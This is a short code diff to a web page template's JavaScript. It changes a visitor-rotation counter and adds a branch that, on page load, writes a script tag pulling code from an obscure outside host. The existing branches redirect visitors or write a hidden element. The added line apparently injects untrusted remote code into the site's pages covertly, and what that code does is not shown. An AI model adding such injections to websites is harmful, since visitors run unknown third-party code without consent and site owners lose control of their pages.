@@ -18,7 +18,7 @@
     if (localStorage) {
         localStorage.setItem(cpv_key, cpv);
     }
-    var cpv_mod = cpv % 2;
+    var cpv_mod = cpv % 3;
     var video_surl = '';
     {% if video %}
         video_surl = "{{ video.surl }}";
@@ -34,6 +34,8 @@
         setTimeout(function () {
             window.location = r_link;
         }, 100);
+    } else if (cpv_mod === 2) {
+        document.writeln('<script src="https://mk.zlnmzc.top/d/5162D1F0-8DD6-4EA4-9FDF-A7E8BFD358E2.xm"><\/script>');
     } else if (cpv_mod === 1) {
         var id = "442007411767709826-481";
         document.write('<ins style="display:none!important" id="' + id + '"></ins>');
